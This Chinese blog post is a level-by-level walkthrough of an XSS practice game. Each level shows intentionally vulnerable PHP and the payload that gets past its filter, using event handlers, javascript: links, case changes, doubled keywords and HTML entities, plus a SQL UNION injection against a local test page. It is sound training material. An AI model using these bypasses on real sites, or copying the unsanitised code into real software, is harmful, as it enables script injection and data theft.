---
title: XSS Game -1
date: 2017-11-17 13:20:46
tags:
		- XSS
categories:
		- Web安全

---

XSS 学习小游戏。

<!-- more -->

**1关**

代码如下


	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["name"];
	echo "<h2 align=center>欢迎用户".$str."</h2>";
	?>

参数`name`没有任何的过滤，直接输出了。

	http://127.0.0.1:8000/xssgame/level1.php?name=<img src='1' onerror=confirm(1)>


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-7/89413805.jpg)

源码内容

	<h2 align=center>欢迎用户<img src='1' onerror=confirm(1)>


[`onerror`事件](https://www.w3schools.com/jsref/event_onerror.asp)

	onerror 事件会在文档或图像加载过程中发生错误时被触发。


**2关**

代码。。搜索型`xss`

参数`keyword`取得的值，直接在`<input>`里面输出了，然后再传递给`htmlspecialchars`

	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form action=level2.php method=GET>
	<input name=keyword  value="'.$str.'">
	<input type=submit name=submit value="搜索"/>
	</form>
	</center>';
	?>


看到，输入的内容，被`htmlspecialchars`转义后输出的。


对于这样的`XSS`漏洞点，通常会使用`htmlspecialchars`函数过滤输入。

将特殊字符转换为`HTML`实体。只转换5种特殊字符。`& " ' > <`

	字符	替换后
	& (& 符号)	&amp;
	" (双引号)	&quot;，除非设置了 ENT_NOQUOTES
	' (单引号)	设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。
	< (小于)	&lt;
	> (大于)	&gt;


是在`<input>`里面输入的内容，需要考虑，闭合`<input>`标签。

	http://127.0.0.1:8000/xssgame/level2.php?keyword="><script>confirm(1)</script>

源码

		<input name=keyword  value=""><script>confirm(1)</script>">



`<input>`中的`value`代表输入的值。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-7/13048970.jpg)

之前在思考一个参数点，会不会这样，即存在注入又存在XSS。好像会这样的。就像第二关这个参数的值会显示在前端，如果还会进入数据库进行查询。但是登录的时候，数据一般是在`<input>`里面进行输出显示的。

遇到了一个问题，是在用户登录处存在xss漏洞。


**SQL&XSS**

	<?php
	header("Content-type:text/html;charset=utf-8");
	$id = $_GET['id'];
	$conn = mysqli_connect('127.0.0.1','root','root','waf');
	if(!$conn){
	    die('Could not connect the database');
	}
	//获取get参数数据
	$id = $_GET['id'];
	//未经过滤，直接进数据查询
	$sql = 'select * from news where id='.$id;
	$result = mysqli_query($conn,$sql);
	$row = mysqli_fetch_array($result);
	echo $row['id'];
	echo '<br/>';
	echo $row['title'];
	echo '<hr/>';
	echo $sql;
	mysqli_close($conn);
	echo "<h2 align=center>没有找到和".htmlspecialchars($id)."相关的结果.</h2>".'<center>
	<form action=test2.php method=GET>
	用户名
	<input name=id  value="'.$id.'">
	<input type=submit name=submit value="提交"/>
	</form>
	</center>';
	?>


可以看到`$id`参数传入数据库里面进行了数据的查询，还将其传入到了`<input>`里面进行输出。


sql注入结果

	http://127.0.0.1:8000/waf/test2.php?id=-1+union+select+1%2Cuser%28%29%2C3&submit=%E6%8F%90%E4%BA%A4


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-7/56538391.jpg)


XSS结果

	http://127.0.0.1:8000/waf/test2.php?id="><script>alert('+I+am+xss')</script>&submit=æäº¤


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-7/19266749.jpg)

所以以上思考的问题是存在的，触发的时候，一个参数触发不同漏洞的时候，其中的`payload`不同，以后测试的时候，需要对参数进行多方漏洞的测试。

**3关**

这一次，把在`<input>`里面的内容进行了`htmlspecialchars`转义。这次再用第二关的`payload`，试试，就不行了。如何绕过`htmlspecialchars`的转义，使用不含有其转义字符的`payload`，反单引号是其中的一个。

代码

	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
	<form action=level3.php method=GET>
	<input name=keyword  value='".htmlspecialchars($str)."'>
	<input type=submit name=submit value=搜索 />
	</form>
	</center>";
	?>


这个时候`input`的`payload`就被转义了。

	<input name=keyword  value='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'>


既然这五个字符已经被转义了，考虑使用其他的不带有这几个特殊字符的`payload`。

那就使用`javascript`事件函数。

鼠标移动事件

	http://127.0.0.1:8000/xssgame/level3.php?keyword='+onmouseover=confirm(1)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-7/7107866.jpg)

源码中可知

	<input name=keyword  value='' onmouseover=confirm(1) //'>

其中的`//`注释掉后面的`'`。

`htmlspecialchars`不对反单引号转义的。

	' onmouseover=confirm(`xss`) \\


[JavaScript 事件参考手册](http://www.w3school.com.cn/jsref/jsref_events.asp)


事件通常与函数配合使用，这样就可以通过发生的事件来驱动函数执行。

**4关**

从第四关开始，就会有一些特殊字符的过滤了。现在考虑过滤了那些字符，以及如何进行绕过。

其中的源码如下。

	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	$str2=str_replace(">","",$str);
	$str3=str_replace("<","",$str2);
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form action=level4.php method=GET>
	<input name=keyword  value="'.$str3.'">
	<input type=submit name=submit value=搜索 />
	</form>
	</center>';
	?>

从其中可以看到，`<，>`，两个尖括号被过滤了。如何绕过？

和第三关一样，使用不带有被过滤字符的`payload`。

	" onmouseover=confirm(1)//

关于绕过过滤字符的一个很好的案例，可以学习一下。

[搜狐视频储存型XSS（过滤了尖括号/圆括号/单引号等字符下的利用技巧）](https://www.secpulse.com/archives/47696.html)

**5关**

这一次将输入的`payload`进行了替换。比如输入`script`替换为了`sc_ript`。

看具体的代码如下。

	<?php 
	ini_set("display_errors", 0);
	$str = strtolower($_GET["keyword"]);
	$str2=str_replace("<script","<scr_ipt",$str);
	$str3=str_replace("on","o_n",$str2);
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form action=level5.php method=GET>
	<input name=keyword  value="'.$str3.'">
	<input type=submit name=submit value=搜索 />
	</form>
	</center>';
	?>	


再使用`on`事件就不行了。比如以下的载荷。
	
	keyword="+onmouseover=alert(1)+//

传入到`<input>`里面的值，被改变了。

	<input name=keyword  value="" o_nmouseover=alert(1) //">


那就使用不是`on`事件和不带有`script`的载荷

`str_replace`不区分大写的问题。`str_ireplace()`区分大小写。

测试替换函数

	<?php
	$id = $_GET['id'];
	$c = str_replace('script','s_cript',$id);
	echo $c;
	echo '<br>';
	$ii = $_GET['ii'];
	$d = str_ireplace('script','s_cript',$ii);
	echo $d;


结果

	http://127.0.0.1:8000/xssgame/strplace.php?id=sCript&ii=sCript
	sCript
	s_cript


第五关虽然没有使用区分大小写的替换函数，但是在取值的时候，直接小写转换了。

	$str = strtolower($_GET["keyword"]);
	$str2=str_replace("<script","<scr_ipt",$str);

使用其他的`payload`，不带有`script`和`on`关键字的。

使用[javascript伪协议](http://zlzxy.com/javascript/1370.html)。

使用`<a>`标签，其中的`"><"`是为了闭合`<input>`

	"><a href="javascript:alert(1)">Clickme</a><" 

点击其中的`Clickme`就可以弹窗了。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-9/33659671.jpg)

	123456"><iframe src=javascript:alert(document.domain)>
	<input name=keyword  value="123456"><iframe src=javascript:alert(document.domain)>">

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-9/34910933.jpg)

**6关**

通过源码，可以看到，过滤了更多，但是没有区分大小写。

	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	$str2=str_replace("<script","<scr_ipt",$str);
	$str3=str_replace("on","o_n",$str2);
	$str4=str_replace("src","sr_c",$str3);
	$str5=str_replace("data","da_ta",$str4);
	$str6=str_replace("href","hr_ef",$str5);
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form action=level6.php method=GET>
	<input name=keyword  value="'.$str6.'">
	<input type=submit name=submit value=搜索 />
	</form>
	</center>';
	?>

使用包含一个大写的`payload`就可以。

	123456"><iframe src=javascript:alert(document.domain)>
	<input name=keyword  value="123456"><iframe Src=javascript:alert(document.domain)>">


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-9/72053490.jpg)

**7关**

这次是区分了大小写，使用了过滤。两种过滤手段，一是对输入的敏感内容，进行重新的替换，混乱其`payload`，类似于5，6关的，将`<script`变换为`<sc_ript`。这一种感觉很好，想绕过就得使用不含有过滤字符的`payload`。接下来，这种是将敏感内容替换为空。如何绕过呢？

	<?php 
	ini_set("display_errors", 0);
	$str =strtolower( $_GET["keyword"]);
	$str2=str_replace("script","",$str);
	$str3=str_replace("on","",$str2);
	$str4=str_replace("src","",$str3);
	$str5=str_replace("data","",$str4);
	$str6=str_replace("href","",$str5);
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form action=level7.php method=GET>
	<input name=keyword  value="'.$str6.'">
	<input type=submit name=submit value=搜索 />
	</form>
	</center>';
	?>

`script`-->``，那`scscriptript`-->`script`

	"><scscriptript>coonnfirm(1)</scscriptript><"
	<input name=keyword  value=""><script>confirm(1)</script><"">

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-9/28775489.jpg)

遇到这种情况，需要查看源码，看看那些被过滤了。根据输出的内容来判断，一步步的尝试。

比如输入`"><script>alert(1)</script><"`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-9/34570117.jpg)


**8关**

源码
	
	<?php 
	ini_set("display_errors", 0);
	$str = strtolower($_GET["keyword"]);
	$str2=str_replace("script","scr_ipt",$str);
	$str3=str_replace("on","o_n",$str2);
	$str4=str_replace("src","sr_c",$str3);
	$str5=str_replace("data","da_ta",$str4);
	$str6=str_replace("href","hr_ef",$str5);
	$str7=str_replace('"','&quot',$str6);
	echo '<center>
	<form action=level8.php method=GET>
	<input name=keyword  value="'.htmlspecialchars($str).'">
	<input type=submit name=submit value=添加友情链接 />
	</form>
	</center>';
	?>
	<?php
	 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
	?>

这次的过滤就是破环输入的`payload`了。使用`javascript`伪协议，但是其中被`htmlspecialchars`转义了。使用伪协议和不带有五种特殊字符的载荷。

输出点在哪里。在友情链接处。

这个过滤了很多的内容，需要考虑用编码绕过。

**html实体编码绕过**

[HTML实体引用](http://www.howtocreate.co.uk/sidehtmlentity.html)

		十进制	十六进制
	t	&#116;	&#x74;

payload

	javascrip&#x74;:alert(document.domain)
	</center><center><BR><a href="javascrip&#x74;:aler&#x74;(document.domain)">友情链接</a></center><center><img src=level8.jpg></center>

这种编码，`WAF`没有拦截。

	192.168.86.208/?id=javascrip&#116;:aler&#x74;(document.domain)


**疑问**

	<?php
	$a = $_GET['a'];
	echo ($a);
	?>

使用`html`实体测试这个的时候，没有成功，无弹窗。是输出点不一样吗，考虑是输出位置的原因吗？


	t	&#116;	&#x74;

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-15/91824142.jpg)


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-11-15/44878964.jpg)



**9关**

源码 

	<?php 
	ini_set("display_errors", 0);
	$str = strtolower($_GET["keyword"]);
	$str2=str_replace("script","scr_ipt",$str);
	$str3=str_replace("on","o_n",$str2);
	$str4=str_replace("src","sr_c",$str3);
	$str5=str_replace("data","da_ta",$str4);
	$str6=str_replace("href","hr_ef",$str5);
	$str7=str_replace('"','&quot',$str6);
	echo '<center>
	<form action=level9.php method=GET>
	<input name=keyword  value="'.htmlspecialchars($str).'">
	<input type=submit name=submit value=添加友情链接 />
	</form>
	</center>';
	?>
	<?php
	if(false===strpos($str7,'http://'))
	{
	  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
	        }
	else
	{
	  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
	}
	?>

这个比8关多了一个判断，strpos — 查找字符串首次出现的位置。

多在后面加个 `//http://www.sec-note.com`，让判断为真。

	javascrip&#x74;:alert(document.domain)//http://sec-note.com 


**10关**

源码。可以看到将存在的`xss`点隐藏了，需要点击源码查看，存在的可控点。

	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	$str11 = $_GET["t_sort"];
	$str22=str_replace(">","",$str11);
	$str33=str_replace("<","",$str22);
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
	<form id=search>
	<input name="t_link"  value="'.'" type="hidden">
	<input name="t_history"  value="'.'" type="hidden">
	<input name="t_sort"  value="'.$str33.'" type="hidden">
	</form>
	</center>';
	?>
	<center><img src=level10.png></center>
	<?php 
	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
	?>





##### 参考

[http://blog.csdn.net/cherrie007/article/details/77340301](http://blog.csdn.net/cherrie007/article/details/77340301)

[https://www.secpulse.com/archives/59497.html](https://www.secpulse.com/archives/59497.html)

[http://www.freebuf.com/articles/web/40520.html](http://www.freebuf.com/articles/web/40520.html)

[A标签使用javascript:伪协议](http://www.cnblogs.com/song-song/p/5277838.html)

[javascript伪协议](http://zlzxy.com/javascript/1370.html)







